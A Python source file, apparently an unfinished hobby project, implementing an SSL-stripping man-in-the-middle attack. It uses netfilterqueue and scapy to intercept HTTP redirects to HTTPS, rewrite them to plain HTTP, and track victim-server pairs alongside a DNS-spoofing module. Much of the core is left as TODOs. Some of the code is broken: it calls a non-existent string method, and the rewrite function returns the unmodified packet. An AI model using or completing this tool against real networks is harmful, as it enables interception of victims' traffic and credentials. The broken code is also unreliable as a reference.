import netfilterqueue
import scapy.all as scapy
import dns_spoofing

#https://venafi.com/blog/what-are-ssl-stripping-attacks/
#Typical sequence of events
#1. user reaches out to server with http
#2. server sends response requesting to use https instead
#3. user initiates https connection

#SSL stripping attack
# we want to intercept 2., then initiate https ourselves, and send http to the user

#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.html
#https://scapy.readthedocs.io/en/latest/api/scapy.layers.tls.automaton_cli.html for https connection with server
#example from this page:
#a = TLSClientAutomaton.tlslink(Raw, server="scapy.net", dport=443)
#a.send(HTTP()/HTTPRequest())

#TODO code for keeping track of ssl stripped sessions/victim-server pairs/idk?
#(victim_ip, server_ip) : tls_session
tls_sessions = {}

#Check whether this is a redirect to https
def https_switching_request(scapy_packet):
    if scapy_packet.haslayer(scapy.HTTPResponse):
        http_layer = scapy_packet.getlayer(scapy.HTTPResponse)#https://github.com/secdev/scapy/blob/master/scapy/layers/http.py#L540-L581
        
        https = http_layer.Location.contains('https://') 
        redirect = http_layer.Status_Code[0] == "3" #3xx status code is for redirection (wikipedia)
        
        return https and redirect #if a redirect to https
    return False

# whether there already is a "client <--http--> us <--https--> server" situation
def existing_connection(scapy_packet):
    ip_src = scapy_packet.getlayer(scapy.IP).src
    ip_dst = scapy_packet.getlayer(scapy.IP).dst
    
    if (ip_src, ip_dst) in tls_sessions.keys():
        return True
    if (ip_dst, ip_src) in tls_sessions.keys():
        return True
    return False

def to_server(scapy_packet):
    ip_layer = scapy_packet.getlayer(scapy.IP)
    
    if ip_layer.src in dns_spoofing.victim_addresses.keys():
        return True
    
    return False

#Transforms an https redirect to normal http response
def strip_https_redirect(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    http_layer = scapy_packet.getlayer(scapy.HTTPResponse)
    http_layer.Location = http_layer.Location.replace('https://', 'http://')
    http_layer.Status_Code = "200"

    return packet


#alternative proxy method to just dns spoofing
def proxy_strip_only(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if https_switching_request(scapy_packet):
        #strip https redirect and send http response to client
        stripped_packet = strip_https_redirect(packet)
        packet.set_payload(str(stripped_packet)) #conversion from https://stackoverflow.com/questions/46645142/modify-with-scapy-and-netfilterqueue
        packet.accept()

        #TODO establish https with server
        return

    #When we have https with server and http with client for this session
    if existing_connection(scapy_packet):
        if to_server(scapy_packet):
            print("b")
            #TODO if to server, transform http -> https and send
        else :
            print("c")
            #TODO if to client, transform https -> http and send
        return
    
    packet.accept()